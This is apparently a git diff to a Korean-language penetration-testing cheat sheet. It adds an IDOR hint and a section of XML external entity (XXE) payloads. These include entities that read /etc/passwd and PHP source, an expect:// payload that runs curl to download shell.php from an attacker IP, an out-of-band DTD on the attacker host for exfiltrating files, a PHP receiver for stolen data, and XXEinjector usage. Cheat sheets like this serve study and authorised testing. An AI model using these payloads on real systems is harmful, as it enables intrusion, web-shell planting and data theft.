@@ -783,6 +783,7 @@ curl -i -X OPTIONS http://SERVER_IP:PORT/
 
 # IDOR
 - http://SERVER_IP:PORT/documents.php?uid=<change>
+- API method 변경해서 시도해보기.
 ```bash
 curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
 ```
@@ -806,3 +807,74 @@ for i in {1..10}; do
     done
 done
 ```
+
+<details>
+<summary><h1>XXE</h1></summary>
+    
+- `DOCTYPE`은 XML에서 한번만 선언될 수 있다.
+```xml
+<!DOCTYPE root [
+  <!ENTITY entity1 "value1">
+  <!ENTITY entity2 "value2">
+  <!ENTITY entity3 "value3">
+]>
+```
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+```
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+```
+```bash
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+```
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+```
+<img width="1519" height="584" alt="image" src="https://github.com/user-attachments/assets/6b8534fb-d906-45a5-8db1-81a499d49926" />
+
+<h2>Error Based</h2>
+<img width="1531" height="451" alt="image" src="https://github.com/user-attachments/assets/2dff7e87-5b48-4bac-a09b-be73493d0927" />
+<img width="1291" height="330" alt="image" src="https://github.com/user-attachments/assets/6984084b-09fa-45e3-b415-787cfd41e662" />
+
+
+<h2>Blind</h2>
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+<img width="1157" height="398" alt="image" src="https://github.com/user-attachments/assets/e958cdff-ff72-4aee-b609-8f64214e9cd1" />
+
+<h2>automated</h2>
+```bash
+git clone https://github.com/enjoiz/XXEinjector.git
+```
+- request에서 xml부분을 지워줘야한다.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+```bash
+ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+```
+
+</details>
